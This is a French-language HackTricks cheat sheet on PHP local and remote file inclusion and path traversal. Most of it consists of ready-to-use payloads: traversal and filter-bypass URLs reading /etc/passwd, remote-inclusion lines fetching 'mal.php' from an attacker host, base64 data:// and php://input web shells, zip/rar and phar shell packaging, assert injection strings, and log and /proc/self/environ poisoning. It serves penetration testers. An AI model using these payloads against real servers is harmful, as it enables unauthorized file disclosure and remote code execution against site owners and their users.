# Inclusion de fichier/traversal de chemin

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des pirates exp√©riment√©s et des chasseurs de primes en bugs !

**Perspectives de piratage**\
Engagez-vous avec du contenu qui explore le frisson et les d√©fis du piratage

**Actualit√©s de piratage en temps r√©el**\
Restez inform√© du monde du piratage en √©volution rapide gr√¢ce √† des actualit√©s et des informations en temps r√©el

**Derni√®res annonces**\
Restez inform√© des derni√®res primes de bugs lanc√©es et des mises √† jour cruciales de la plateforme

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs pirates d√®s aujourd'hui !

## Inclusion de fichier

**Inclusion de fichier √† distance (RFI) :** Le fichier est charg√© √† partir d'un serveur distant (Id√©al : Vous pouvez √©crire le code et le serveur l'ex√©cutera). En php, cela est **d√©sactiv√©** par d√©faut (**allow\_url\_include**).\
**Inclusion de fichier local (LFI) :** Le serveur charge un fichier local.

La vuln√©rabilit√© se produit lorsque l'utilisateur peut contr√¥ler de quelque mani√®re que ce soit le fichier qui va √™tre charg√© par le serveur.

**Fonctions PHP vuln√©rables** : require, require\_once, include, include\_once

Un outil int√©ressant pour exploiter cette vuln√©rabilit√© : [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Aveugle - Int√©ressant - Fichiers LFI2RCE
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**M√©langeant plusieurs listes LFI \*nix et ajoutant plus de chemins, j'ai cr√©√© celle-ci :**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

Essayez √©galement de changer `/` pour `\`\
Essayez √©galement d'ajouter `../../../../../`

Une liste qui utilise plusieurs techniques pour trouver le fichier /etc/password (pour v√©rifier si la vuln√©rabilit√© existe) peut √™tre trouv√©e [ici](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Fusion de diff√©rentes listes de mots :

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

Essayez √©galement de changer `/` pour `\`\
Essayez √©galement de supprimer `C:/` et d'ajouter `../../../../../`

Une liste qui utilise plusieurs techniques pour trouver le fichier /boot.ini (pour v√©rifier si la vuln√©rabilit√© existe) peut √™tre trouv√©e [ici](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Consultez la liste LFI de Linux.

## LFI de base et contournements

Tous les exemples sont pour l'inclusion de fichiers locaux mais pourraient √©galement √™tre appliqu√©s √† l'inclusion de fichiers √† distance (page=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### s√©quences de travers√©e d√©pouill√©es de mani√®re non r√©cursive
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Octet nul (%00)**

Contourner l'ajout de caract√®res √† la fin de la cha√Æne fournie (contournement de : $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Cela est **r√©solu depuis PHP 5.4**

### **Encodage**

Vous pourriez utiliser des encodages non standards comme le double encodage d'URL (et d'autres) :
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### √Ä partir du dossier existant

Peut-√™tre que le back-end v√©rifie le chemin du dossier :
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Exploration des r√©pertoires du syst√®me de fichiers sur un serveur

Le syst√®me de fichiers d'un serveur peut √™tre explor√© de mani√®re r√©cursive pour identifier les r√©pertoires, pas seulement les fichiers, en utilisant certaines techniques. Ce processus implique de d√©terminer la profondeur du r√©pertoire et de sonder l'existence de dossiers sp√©cifiques. Voici une m√©thode d√©taill√©e pour y parvenir :

1. **D√©terminer la profondeur du r√©pertoire :** D√©terminez la profondeur de votre r√©pertoire actuel en r√©cup√©rant avec succ√®s le fichier `/etc/passwd` (applicable si le serveur est bas√© sur Linux). Un exemple d'URL pourrait √™tre structur√© comme suit, indiquant une profondeur de trois :
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Sonder des Dossiers :** Ajoutez le nom du dossier suspect√© (par exemple, `private`) √† l'URL, puis naviguez de nouveau vers `/etc/passwd`. Le niveau de r√©pertoire suppl√©mentaire n√©cessite d'incr√©menter la profondeur de un :
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Interpr√©ter les r√©sultats :** La r√©ponse du serveur indique si le dossier existe :
   * **Erreur / Aucune sortie :** Le dossier `private` n'existe probablement pas √† l'emplacement sp√©cifi√©.
   * **Contenu de `/etc/passwd` :** La pr√©sence du dossier `private` est confirm√©e.
4. **Exploration r√©cursive :** Les dossiers d√©couverts peuvent √™tre davantage explor√©s pour rechercher des sous-r√©pertoires ou des fichiers en utilisant la m√™me technique ou des m√©thodes traditionnelles d'inclusion de fichiers locaux (LFI).

Pour explorer des r√©pertoires √† diff√©rents emplacements dans le syst√®me de fichiers, ajustez la charge utile en cons√©quence. Par exemple, pour v√©rifier si `/var/www/` contient un r√©pertoire `private` (en supposant que le r√©pertoire actuel se trouve √† une profondeur de 3), utilisez :
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Technique de Troncature de Chemin**

La troncature de chemin est une m√©thode utilis√©e pour manipuler les chemins de fichiers dans les applications web. Elle est souvent utilis√©e pour acc√©der √† des fichiers restreints en contournant certaines mesures de s√©curit√© qui ajoutent des caract√®res suppl√©mentaires √† la fin des chemins de fichiers. L'objectif est de cr√©er un chemin de fichier qui, une fois modifi√© par la mesure de s√©curit√©, pointe toujours vers le fichier souhait√©.

En PHP, diverses repr√©sentations d'un chemin de fichier peuvent √™tre consid√©r√©es comme √©quivalentes en raison de la nature du syst√®me de fichiers. Par exemple :

* `/etc/passwd`, `/etc//passwd`, `/etc/./passwd` et `/etc/passwd/` sont tous trait√©s comme le m√™me chemin.
* Lorsque les 6 derniers caract√®res sont `passwd`, ajouter un `/` (le transformant en `passwd/`) ne modifie pas le fichier cibl√©.
* De m√™me, si `.php` est ajout√© √† un chemin de fichier (comme `shellcode.php`), ajouter `/.` √† la fin n'alt√©rera pas le fichier qui est acc√©d√©.

Les exemples fournis d√©montrent comment utiliser la troncature de chemin pour acc√©der √† `/etc/passwd`, une cible courante en raison de son contenu sensible (informations de compte utilisateur) :
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Dans ces sc√©narios, le nombre de travers√©es n√©cessaires peut √™tre d'environ 2027, mais ce nombre peut varier en fonction de la configuration du serveur.

* **Utilisation de segments de points et de caract√®res suppl√©mentaires** : Les s√©quences de travers√©e (`../`) combin√©es avec des segments de points suppl√©mentaires et des caract√®res peuvent √™tre utilis√©es pour naviguer dans le syst√®me de fichiers, en ignorant efficacement les cha√Ænes ajout√©es par le serveur.
* **D√©termination du nombre de travers√©es requis** : Par essais et erreurs, on peut trouver le nombre pr√©cis de s√©quences `../` n√©cessaires pour naviguer vers le r√©pertoire racine puis vers `/etc/passwd`, en veillant √† neutraliser toutes les cha√Ænes ajout√©es (comme `.php`) mais en maintenant le chemin souhait√© (`/etc/passwd`) intact.
* **Commencer par un r√©pertoire fictif** : Il est courant de commencer le chemin par un r√©pertoire inexistant (comme `a/`). Cette technique est utilis√©e comme mesure de pr√©caution ou pour r√©pondre aux exigences de la logique d'analyse de chemin du serveur.

Lors de l'utilisation de techniques de troncature de chemin, il est crucial de comprendre le comportement d'analyse de chemin du serveur et la structure du syst√®me de fichiers. Chaque sc√©nario peut n√©cessiter une approche diff√©rente, et des tests sont souvent n√©cessaires pour trouver la m√©thode la plus efficace.

**Cette vuln√©rabilit√© a √©t√© corrig√©e dans PHP 5.3.**

### **Astuces de contournement de filtre**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Inclusion de Fichier √† Distance

En php, cela est d√©sactiv√© par d√©faut car **`allow_url_include`** est **Off.** Il doit √™tre **On** pour fonctionner, et dans ce cas, vous pourriez inclure un fichier PHP depuis votre serveur et obtenir une RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Si, pour une raison quelconque, **`allow_url_include`** est **activ√©**, mais que PHP **filtre** l'acc√®s aux pages web externes, [selon cet article](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), vous pourriez par exemple utiliser le protocole de donn√©es avec base64 pour d√©coder un code PHP b64 et obtenir une RCE:

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
Dans le code pr√©c√©dent, le `+.txt` final a √©t√© ajout√© car l'attaquant avait besoin d'une cha√Æne se terminant par `.txt`, ainsi la cha√Æne se termine avec cela et apr√®s le d√©codage b64, cette partie ne renverra que des donn√©es inutiles et le vrai code PHP sera inclus (et donc, ex√©cut√©).
{% endhint %}

Un autre exemple **sans utiliser le protocole `php://`** serait:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## √âl√©ment racine Python

En python dans un code comme celui-ci :
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Si l'utilisateur passe un **chemin absolu** √† **`file_name`**, le **chemin pr√©c√©dent est simplement supprim√©**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Il s'agit du comportement pr√©vu selon [la documentation](https://docs.python.org/3.10/library/os.path.html#os.path.join) :

> Si un composant est un chemin absolu, tous les composants pr√©c√©dents sont jet√©s et le joint continue √† partir du composant de chemin absolu.

## R√©pertoires de liste Java

Il semble que si vous avez une Travers√©e de Chemin dans Java et que vous **demandez un r√©pertoire** au lieu d'un fichier, un **listing du r√©pertoire est retourn√©**. Cela ne se produira pas dans d'autres langages (√† ma connaissance).

## Top 25 param√®tres

Voici la liste des 25 principaux param√®tres qui pourraient √™tre vuln√©rables aux vuln√©rabilit√©s d'inclusion de fichier local (LFI) (de [lien](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI en utilisant des wrappers et protocoles PHP

### php://filter

Les filtres PHP permettent d'effectuer des op√©rations de **modification de base sur les donn√©es** avant leur lecture ou √©criture. Il existe 5 cat√©gories de filtres :

* [Filtres de cha√Æne](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags` : Supprime les balises des donn√©es (tout ce qui se trouve entre les caract√®res "<" et ">")
* Notez que ce filtre a disparu des versions modernes de PHP
* [Filtres de conversion](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : Transforme en une autre codification (`convert.iconv.<input_enc>.<output_enc>`). Pour obtenir la **liste de toutes les codifications** prises en charge, ex√©cutez dans la console : `iconv -l`

{% hint style="warning" %}
En abusant du filtre de conversion `convert.iconv.*`, vous pouvez **g√©n√©rer du texte arbitraire**, ce qui pourrait √™tre utile pour √©crire du texte arbitraire ou rendre un processus d'inclusion de fonction arbitraire. Pour plus d'informations, consultez [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).
{% endhint %}

* [Filtres de compression](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate` : Compresse le contenu (utile pour exfiltrer beaucoup d'informations)
* `zlib.inflate` : D√©compresse les donn√©es
* [Filtres de chiffrement](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : Obsol√®te
* `mdecrypt.*` : Obsol√®te
* Autres filtres
* En ex√©cutant `var_dump(stream_get_filters());` en PHP, vous pouvez trouver quelques **filtres inattendus** :
* `consumed`
* `dechunk` : inverse le codage chunked HTTP
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,¬£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
La partie "php://filter" est insensible √† la casse
{% endhint %}

### Utilisation des filtres php comme oracle pour lire des fichiers arbitraires

[**Dans ce post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) est propos√©e une technique pour lire un fichier local sans avoir la sortie renvoy√©e par le serveur. Cette technique est bas√©e sur une **exfiltration bool√©enne du fichier (caract√®re par caract√®re) en utilisant les filtres php** comme oracle. Cela est d√ª au fait que les filtres php peuvent √™tre utilis√©s pour rendre un texte suffisamment grand pour provoquer une exception php.

Dans le post original, vous pouvez trouver une explication d√©taill√©e de la technique, mais voici un r√©sum√© rapide :

* Utilisez le codec **`UCS-4LE`** pour laisser le caract√®re initial du texte au d√©but et augmenter exponentiellement la taille de la cha√Æne de caract√®res.
* Cela sera utilis√© pour g√©n√©rer un **texte si grand lorsque la lettre initiale est devin√©e correctement** que php d√©clenchera une **erreur**
* Le filtre **dechunk** va **supprimer tout si le premier caract√®re n'est pas un hexad√©cimal**, donc nous pouvons savoir si le premier caract√®re est hexad√©cimal.
* Cela, combin√© avec le pr√©c√©dent (et d'autres filtres en fonction de la lettre devin√©e), nous permettra de deviner une lettre au d√©but du texte en voyant quand nous faisons suffisamment de transformations pour qu'elle ne soit plus un caract√®re hexad√©cimal. Parce que si c'est hexad√©cimal, dechunk ne le supprimera pas et la bombe initiale provoquera une erreur php.
* Le codec **convert.iconv.UNICODE.CP930** transforme chaque lettre en la suivante (donc apr√®s ce codec : a -> b). Cela nous permet de d√©couvrir si la premi√®re lettre est un `a` par exemple car si nous appliquons 6 fois ce codec a->b->c->d->e->f->g la lettre n'est plus un caract√®re hexad√©cimal, donc dechunk ne le supprime pas et l'erreur php est d√©clench√©e car elle se multiplie avec la bombe initiale.
* En utilisant d'autres transformations comme **rot13** au d√©but, il est possible de divulguer d'autres caract√®res comme n, o, p, q, r (et d'autres codecs peuvent √™tre utilis√©s pour d√©placer d'autres lettres dans la plage hexad√©cimale).
* Lorsque le caract√®re initial est un chiffre, il est n√©cessaire de l'encoder en base64 et de divulguer les 2 premi√®res lettres pour divulguer le chiffre.
* Le probl√®me final est de voir **comment divulguer plus que la lettre initiale**. En utilisant des filtres de m√©moire d'ordre comme **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** il est possible de changer l'ordre des caract√®res et d'obtenir dans la premi√®re position d'autres lettres du texte.
* Et afin de pouvoir obtenir **davantage de donn√©es**, l'id√©e est de **g√©n√©rer 2 octets de donn√©es ind√©sirables au d√©but** avec **convert.iconv.UTF16.UTF16**, appliquer **UCS-4LE** pour le faire **pivoter avec les 2 octets suivants**, et **supprimer les donn√©es jusqu'aux donn√©es ind√©sirables** (cela supprimera les 2 premiers octets du texte initial). Continuez √† faire cela jusqu'√† ce que vous atteigniez le bit d√©sir√© √† divulguer.

Dans le post, un outil pour effectuer cela automatiquement a √©galement √©t√© divulgu√© : [php\_filters\_chain\_oracle\_exploit](https://github.com/synacktiv/php\_filter\_chains\_oracle\_exploit).

### php://fd

Ce wrapper permet d'acc√©der aux descripteurs de fichiers ouverts par le processus. Potentiellement utile pour exfiltrer le contenu des fichiers ouverts :
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Vous pouvez √©galement utiliser **php://stdin, php://stdout et php://stderr** pour acc√©der respectivement aux **descripteurs de fichiers 0, 1 et 2** (pas s√ªr de comment cela pourrait √™tre utile dans une attaque)

### zip:// et rar://

T√©l√©chargez un fichier Zip ou Rar avec un PHPShell √† l'int√©rieur et y acc√©dez.\
Pour pouvoir abuser du protocole rar, il **doit √™tre activ√© sp√©cifiquement**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://

La technique `data://` peut √™tre utilis√©e pour inclure des donn√©es directement dans une URL. Cela peut √™tre exploit√© pour ex√©cuter du code arbitraire ou afficher des informations sensibles.
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Notez que ce protocole est restreint par les configurations php **`allow_url_open`** et **`allow_url_include`**

### expect://

Expect doit √™tre activ√©. Vous pouvez ex√©cuter du code en utilisant ceci:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Sp√©cifiez votre charge utile dans les param√®tres POST :
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Un fichier `.phar` peut √™tre utilis√© pour ex√©cuter du code PHP lorsqu'une application web utilise des fonctions telles que `include` pour le chargement de fichiers. L'extrait de code PHP ci-dessous montre la cr√©ation d'un fichier `.phar` :
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Pour compiler le fichier `.phar`, la commande suivante doit √™tre ex√©cut√©e :
```bash
php --define phar.readonly=0 create_path.php
```
√Ä l'ex√©cution, un fichier nomm√© `test.phar` sera cr√©√©, ce qui pourrait potentiellement √™tre exploit√© pour les vuln√©rabilit√©s d'Inclusion de Fichier Local (LFI).

Dans les cas o√π le LFI se contente de lire des fichiers sans ex√©cuter le code PHP √† l'int√©rieur, √† travers des fonctions telles que `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, ou `filesize()`, une tentative d'exploitation d'une vuln√©rabilit√© de d√©s√©rialisation pourrait √™tre envisag√©e. Cette vuln√©rabilit√© est associ√©e √† la lecture de fichiers en utilisant le protocole `phar`.

Pour une compr√©hension d√©taill√©e de l'exploitation des vuln√©rabilit√©s de d√©s√©rialisation dans le contexte des fichiers `.phar`, veuillez vous r√©f√©rer au document li√© ci-dessous :

[Guide d'Exploitation de D√©s√©rialisation Phar](phar-deserialization.md)

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### Plus de protocoles

V√©rifiez plus de[ **protocoles √† inclure ici**](https://www.php.net/manual/en/wrappers.php)**:**

* [php://memory et php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) ‚Äî √âcrire en m√©moire ou dans un fichier temporaire (pas s√ªr de comment cela peut √™tre utile dans une attaque d'inclusion de fichier)
* [file://](https://www.php.net/manual/en/wrappers.file.php) ‚Äî Acc√©der au syst√®me de fichiers local
* [http://](https://www.php.net/manual/en/wrappers.http.php) ‚Äî Acc√©der aux URL HTTP(s)
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) ‚Äî Acc√©der aux URL FTP(s)
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) ‚Äî Flux de compression
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) ‚Äî Trouver des chemins correspondant √† un motif (ne renvoie rien d'imprimable, donc pas vraiment utile ici)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) ‚Äî Shell s√©curis√© 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) ‚Äî Flux audio (Pas utile pour lire des fichiers arbitraires)

## LFI via 'assert' de PHP

Les risques d'Inclusion de Fichier Local (LFI) en PHP sont particuli√®rement √©lev√©s lorsqu'il s'agit de la fonction 'assert', qui peut ex√©cuter du code √† l'int√©rieur de cha√Ænes. Cela pose particuli√®rement probl√®me si une entr√©e contenant des caract√®res de travers√©e de r√©pertoire comme ".." est v√©rifi√©e mais non correctement d√©sinfect√©e.

Par exemple, le code PHP pourrait √™tre con√ßu pour emp√™cher la travers√©e de r√©pertoire de la mani√®re suivante :
```bash
assert("strpos('$file', '..') === false") or die("");
```
Bien que cela vise √† arr√™ter la travers√©e, cela cr√©e involontairement un vecteur pour l'injection de code. Pour exploiter ceci et lire le contenu des fichiers, un attaquant pourrait utiliser :
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
De m√™me, pour ex√©cuter des commandes syst√®me arbitraires, on pourrait utiliser :
```plaintext
' and die(system("id")) or '
```
Il est important d'**encoder ces charges utiles en URL**.

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers exp√©riment√©s et des chasseurs de primes en bugs !

**Perspectives de Hacking**\
Engagez-vous avec du contenu qui explore le frisson et les d√©fis du hacking

**Actualit√©s de Hacking en Temps R√©el**\
Restez √† jour avec le monde du hacking en constante √©volution gr√¢ce aux actualit√©s et aux perspectives en temps r√©el

**Derni√®res Annonces**\
Restez inform√© des derni√®res primes de bugs lanc√©es et des mises √† jour cruciales de la plateforme

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs hackers d√®s aujourd'hui !

## Travers√©e de Chemin PHP √† l'Aveugle

{% hint style="warning" %}
Cette technique est pertinente dans les cas o√π vous **contr√¥lez** le **chemin du fichier** d'une **fonction PHP** qui va **acc√©der √† un fichier** mais dont vous ne verrez pas le contenu (comme un simple appel √† **`file()`**) mais le contenu n'est pas affich√©.
{% endhint %}

Dans [**cet article incroyable**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html), il est expliqu√© comment une travers√©e de chemin √† l'aveugle peut √™tre exploit√©e via le filtre PHP pour **exfiltrer le contenu d'un fichier via un oracle d'erreur**.

En r√©sum√©, la technique utilise le codage **"UCS-4LE"** pour rendre le contenu d'un fichier si **volumineux** que la **fonction PHP ouvrant** le fichier d√©clenchera une **erreur**.

Ensuite, pour divulguer le premier caract√®re, le filtre **`dechunk`** est utilis√© avec d'autres tels que **base64** ou **rot13** et enfin les filtres **convert.iconv.UCS-4.UCS-4LE** et **convert.iconv.UTF16.UTF-16BE** sont utilis√©s pour **placer d'autres caract√®res au d√©but et les divulguer**.

**Fonctions qui pourraient √™tre vuln√©rables** : `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (cible uniquement en lecture avec ceci)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Pour les d√©tails techniques, consultez l'article mentionn√© !

## LFI2RCE

### Inclusion de Fichier √† Distance

Expliqu√© pr√©c√©demment, [**suivez ce lien**](./#remote-file-inclusion).

### Via le fichier journal Apache/Nginx

Si le serveur Apache ou Nginx est **vuln√©rable √† une LFI** √† l'int√©rieur de la fonction d'inclusion, vous pourriez essayer d'acc√©der √† **`/var/log/apache2/access.log` ou `/var/log/nginx/access.log`**, d√©finir √† l'int√©rieur de l'**agent utilisateur** ou √† l'int√©rieur d'un **param√®tre GET** une coquille PHP comme **`<?php system($_GET['c']); ?>`** et inclure ce fichier

{% hint style="warning" %}
Notez que **si vous utilisez des guillemets doubles** pour la coquille au lieu de **simples guillemets**, les guillemets doubles seront modifi√©s pour la cha√Æne "_**quote;**_", **PHP lancera une erreur** √† cet endroit et **rien d'autre ne sera ex√©cut√©**.

Assurez-vous √©galement d'**√©crire correctement la charge utile** ou PHP g√©n√©rera une erreur √† chaque fois qu'il essaiera de charger le fichier journal et vous n'aurez pas de deuxi√®me opportunit√©.
{% endhint %}

Cela pourrait √©galement √™tre fait dans d'autres journaux mais **soyez prudent,** le code √† l'int√©rieur des journaux pourrait √™tre encod√© en URL et cela pourrait d√©truire la Coquille. L'en-t√™te **autorisation "basic"** contient "utilisateur: mot de passe" en Base64 et est d√©cod√© √† l'int√©rieur des journaux. La Coquille PHP pourrait √™tre ins√©r√©e √† l'int√©rieur de cet en-t√™te.\
Autres chemins de journaux possibles:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
### Via Email

**Envoyez un e-mail** √† un compte interne (user@localhost) contenant votre charge utile PHP comme `<?php echo system($_REQUEST["cmd"]); ?>` et essayez de l'inclure dans le courriel de l'utilisateur avec un chemin comme **`/var/mail/<USERNAME>`** ou **`/var/spool/mail/<USERNAME>`**

### Via /proc/\*/fd/\*

1. T√©l√©chargez beaucoup de coquilles (par exemple : 100)
2. Incluez [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), avec $PID = PID du processus (peut √™tre forc√© en brut) et $FD le descripteur de fichier (peut √©galement √™tre forc√© en brut)

### Via /proc/self/environ

Comme un fichier journal, envoyez la charge utile dans l'User-Agent, elle sera refl√©t√©e √† l'int√©rieur du fichier /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Via t√©l√©chargement

Si vous pouvez t√©l√©charger un fichier, injectez simplement la charge utile de l'interpr√©teur de commandes dedans (par exemple : `<?php system($_GET['c']); ?>`).
```
